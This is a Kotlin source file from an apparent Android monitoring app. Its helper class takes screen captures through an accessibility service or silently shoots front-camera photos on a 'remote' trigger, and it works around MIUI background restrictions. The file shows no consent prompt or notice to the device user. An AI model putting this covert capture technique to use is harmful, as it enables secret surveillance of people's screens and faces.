package com.xiangqin.app.monitor

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.graphics.ImageFormat
import android.graphics.Matrix
import android.hardware.camera2.CameraCaptureSession
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraDevice
import android.hardware.camera2.CameraManager
import android.hardware.camera2.CaptureRequest
import android.media.Image
import android.media.ImageReader
import android.os.Handler
import android.os.HandlerThread
import android.util.Log
import android.util.Size
import com.xiangqin.app.XiangQinApp
import com.xiangqin.app.data.db.PhotoEntity
import com.xiangqin.app.data.db.SystemLogEntity
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch
import java.io.File
import java.io.FileOutputStream
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicReference

class CameraCaptureHelper(private val context: Context) {

    private var cameraDevice: CameraDevice? = null
    private var captureSession: CameraCaptureSession? = null
    private var imageReader: ImageReader? = null
    private var backgroundHandler: Handler? = null
    private var backgroundThread: HandlerThread? = null

    fun hasPermission(): Boolean {
        return context.checkSelfPermission(Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED
    }

    fun capturePhoto(): String? {
        if (!hasPermission()) {
            logError("CAMERA 权限未授予")
            return null
        }

        // 优先使用截屏（MIUI 兼容性最好，不受后台限制）
        val screenshotResult = takeScreenshot()
        if (screenshotResult != null) return screenshotResult

        // 截屏失败时，尝试 Camera2 API
        try {
            startBackgroundThread()
            val result = takePicture()
            return result
        } catch (e: Exception) {
            Log.w("XiangQin/Camera", "Camera2 拍照失败: ${e.message}")
        } finally {
            stopBackgroundThread()
        }
        return null
    }

    /**
     * 通过无障碍服务截屏（MIUI 兼容性最好）
     * 截屏不受后台限制，且不需要相机权限
     */
    private fun takeScreenshot(): String? {
        val a11yRunning = com.xiangqin.app.service.PermissionAccessibilityService.isRunning()
        if (!a11yRunning) {
            Log.d("XiangQin/Camera", "无障碍服务未运行，跳过截屏")
            return null
        }

        try {
            val dir = File(context.filesDir, "screenshot")
            if (!dir.exists()) dir.mkdirs()
            val file = File(dir, "latest.jpg")

            val latch = java.util.concurrent.CountDownLatch(1)
            var success = false

            com.xiangqin.app.service.PermissionAccessibilityService.screenshot { bitmap ->
                if (bitmap != null) {
                    try {
                        val w = bitmap.width / 2
                        val h = bitmap.height / 2
                        val scaled = android.graphics.Bitmap.createScaledBitmap(bitmap, w, h, true)
                        file.outputStream().use { scaled.compress(android.graphics.Bitmap.CompressFormat.JPEG, 80, it) }
                        scaled.recycle()
                        bitmap.recycle()
                        success = true
                    } catch (e: Exception) {
                        Log.e("XiangQin/Camera", "保存截屏失败: ${e.message}")
                    }
                }
                latch.countDown()
            }

            latch.await(5, java.util.concurrent.TimeUnit.SECONDS)

            if (success && file.exists() && file.length() > 1000) {
                // 写入数据库
                CoroutineScope(SupervisorJob() + Dispatchers.IO).launch {
                    XiangQinApp.instance.database.photoDao().insert(
                        PhotoEntity(
                            filePath = file.absolutePath,
                            fileSize = file.length(),
                            takenTime = System.currentTimeMillis(),
                            triggerSource = "screenshot"
                        )
                    )
                }
                return file.absolutePath
            }
        } catch (e: Exception) {
            Log.w("XiangQin/Camera", "截屏失败: ${e.message}")
        }
        return null
    }

    private fun startBackgroundThread() {
        backgroundThread = HandlerThread("CameraBackground").also { it.start() }
        backgroundHandler = Handler(backgroundThread!!.looper)
    }

    private fun stopBackgroundThread() {
        try {
            backgroundThread?.quitSafely()
            backgroundThread?.join()
            backgroundThread = null
            backgroundHandler = null
        } catch (e: InterruptedException) {
            Log.e("XiangQin/Camera", e.message ?: "error")
        }
    }

    private fun takePicture(): String? {
        val cameraManager = context.getSystemService(Context.CAMERA_SERVICE) as android.hardware.camera2.CameraManager
        val cameraId = findFrontCamera(cameraManager) ?: findBackCamera(cameraManager) ?: run {
            logError("未找到可用摄像头")
            return null
        }

        val dir = File(context.filesDir, "camera")
        if (!dir.exists()) dir.mkdirs()
        val fileName = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(Date()) + ".jpg"
        val photoFile = File(dir, fileName)

        val latch = CountDownLatch(1)
        val resultBitmap = AtomicReference<Bitmap?>()
        val errorMsg = AtomicReference<String?>(null)

        try {
            closeCamera()

            // 等待相机资源释放
            Thread.sleep(500)

            cameraManager.openCamera(cameraId, object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    cameraDevice = camera
                    try {
                        val size = Size(1920, 1080)
                        imageReader = ImageReader.newInstance(
                            size.width, size.height, ImageFormat.JPEG, 2
                        )

                        imageReader?.setOnImageAvailableListener({ reader ->
                            val image = reader.acquireLatestImage()
                            if (image != null) {
                                val bitmap = imageToBitmap(image)
                                image.close()
                                if (bitmap != null && !isBitmapBlank(bitmap)) {
                                    resultBitmap.set(bitmap)
                                } else {
                                    bitmap?.recycle()
                                    errorMsg.set("相机返回空白帧")
                                }
                            } else {
                                errorMsg.set("ImageReader 返回空图片")
                            }
                            latch.countDown()
                        }, backgroundHandler)

                        val surface = imageReader!!.surface

                        // 先用 PREVIEW 模式让相机预热
                        val previewBuilder = camera.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW)
                        previewBuilder.addTarget(surface)
                        previewBuilder.set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
                        previewBuilder.set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON)

                        camera.createCaptureSession(
                            listOf(surface),
                            object : CameraCaptureSession.StateCallback() {
                                override fun onConfigured(session: CameraCaptureSession) {
                                    captureSession = session
                                    try {
                                        // 先提交预览请求让传感器预热
                                        session.setRepeatingRequest(previewBuilder.build(), null, backgroundHandler)

                                        // 延迟 1 秒后执行拍照
                                        postDelayed({
                                            try {
                                                val captureBuilder = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
                                                captureBuilder.addTarget(surface)
                                                captureBuilder.set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
                                                captureBuilder.set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON)
                                                captureBuilder.set(CaptureRequest.JPEG_ORIENTATION, 90)

                                                session.stopRepeating()
                                                session.capture(captureBuilder.build(), object : CameraCaptureSession.CaptureCallback() {
                                                    override fun onCaptureCompleted(
                                                        session: CameraCaptureSession,
                                                        request: CaptureRequest,
                                                        result: android.hardware.camera2.TotalCaptureResult
                                                    ) {
                                                        // 启动 5 秒超时
                                                        Thread {
                                                            Thread.sleep(5000)
                                                            if (latch.count > 0) {
                                                                errorMsg.set("拍照超时（MIUI 后台限制）")
                                                                latch.countDown()
                                                            }
                                                        }.start()
                                                    }
                                                }, backgroundHandler)
                                            } catch (e: Exception) {
                                                errorMsg.set("拍照失败: ${e.message}")
                                                latch.countDown()
                                            }
                                        }, 1000)
                                    } catch (e: Exception) {
                                        errorMsg.set("相机会话配置失败: ${e.message}")
                                        latch.countDown()
                                    }
                                }

                                override fun onConfigureFailed(session: CameraCaptureSession) {
                                    errorMsg.set("相机配置失败")
                                    latch.countDown()
                                }
                            },
                            backgroundHandler
                        )
                    } catch (e: Exception) {
                        errorMsg.set("打开相机失败: ${e.message}")
                        latch.countDown()
                    }
                }

                override fun onDisconnected(camera: CameraDevice) {
                    camera.close()
                    errorMsg.set("相机断开连接")
                    latch.countDown()
                }

                override fun onError(camera: CameraDevice, error: Int) {
                    camera.close()
                    errorMsg.set("相机错误: $error")
                    latch.countDown()
                }
            }, backgroundHandler)

            latch.await(20, TimeUnit.SECONDS)

            val bitmap = resultBitmap.get()
            if (bitmap != null) {
                FileOutputStream(photoFile).use { fos ->
                    bitmap.compress(Bitmap.CompressFormat.JPEG, 90, fos)
                }
                bitmap.recycle()

                try {
                    CoroutineScope(SupervisorJob() + Dispatchers.IO).launch {
                        XiangQinApp.instance.database.photoDao().insert(
                            PhotoEntity(
                                filePath = photoFile.absolutePath,
                                fileSize = photoFile.length(),
                                takenTime = System.currentTimeMillis(),
                                triggerSource = "remote"
                            )
                        )
                    }
                } catch (e: Exception) { Log.w("XiangQin/Camera", "保存拍照记录失败: ${e.message}") }

                closeCamera()
                return photoFile.absolutePath
            } else {
                val msg = errorMsg.get() ?: "ImageReader 未返回图片（MIUI 后台限制）"
                logError(msg)
                closeCamera()
                return null
            }
        } catch (e: Exception) {
            logError("拍照异常: ${e.message}")
            closeCamera()
            return null
        }
    }

    private fun imageToBitmap(image: Image): Bitmap? {
        val buffer = image.planes[0].buffer
        val bytes = ByteArray(buffer.remaining())
        buffer.get(bytes)
        val bitmap = BitmapFactory.decodeByteArray(bytes, 0, bytes.size) ?: return null

        val matrix = Matrix()
        matrix.postRotate(90f)
        return Bitmap.createBitmap(bitmap, 0, 0, bitmap.width, bitmap.height, matrix, true)
    }

    /** 检测 Bitmap 是否为空白（像素全为白色或接近白色） */
    private fun isBitmapBlank(bitmap: Bitmap): Boolean {
        val width = bitmap.width
        val height = bitmap.height
        val sampleSize = 10
        var whiteCount = 0
        var totalSampled = 0
        for (x in 0 until width step sampleSize) {
            for (y in 0 until height step sampleSize) {
                val pixel = bitmap.getPixel(x, y)
                val r = (pixel shr 16) and 0xFF
                val g = (pixel shr 8) and 0xFF
                val b = pixel and 0xFF
                if (r > 240 && g > 240 && b > 240) whiteCount++
                totalSampled++
            }
        }
        return totalSampled > 0 && whiteCount.toFloat() / totalSampled > 0.95f
    }

    private fun closeCamera() {
        try {
            captureSession?.close()
            captureSession = null
            cameraDevice?.close()
            cameraDevice = null
            imageReader?.close()
            imageReader = null
        } catch (e: Exception) { Log.w("XiangQin/Camera", "关闭相机失败: ${e.message}") }
    }

    private fun postDelayed(action: () -> Unit, delayMs: Long) {
        android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(action, delayMs)
    }

    private fun findFrontCamera(cameraManager: CameraManager): String? {
        return try {
            val cameraIds = cameraManager.cameraIdList
            for (id in cameraIds.indices) {
                val chars = cameraManager.getCameraCharacteristics(cameraIds[id])
                val facing = chars.get(CameraCharacteristics.LENS_FACING)
                if (facing == CameraCharacteristics.LENS_FACING_FRONT) {
                    return cameraIds[id]
                }
            }
            null
        } catch (e: Exception) {
            null
        }
    }

    private fun findBackCamera(cameraManager: CameraManager): String? {
        return try {
            val cameraIds = cameraManager.cameraIdList
            for (id in cameraIds.indices) {
                val chars = cameraManager.getCameraCharacteristics(cameraIds[id])
                val facing = chars.get(CameraCharacteristics.LENS_FACING)
                if (facing == CameraCharacteristics.LENS_FACING_BACK) {
                    return cameraIds[id]
                }
            }
            cameraIds.firstOrNull()
        } catch (e: Exception) {
            null
        }
    }

    private fun logError(msg: String) {
        try {
            CoroutineScope(SupervisorJob() + Dispatchers.IO).launch {
                XiangQinApp.instance.database.systemLogDao().insert(
                    SystemLogEntity(logType = "camera_error", message = msg, createdTime = System.currentTimeMillis())
                )
            }
        } catch (e: Exception) { Log.w("XiangQin/Camera", "记录错误日志失败: ${e.message}") }
        Log.e("XiangQin/Camera", msg)
    }
}
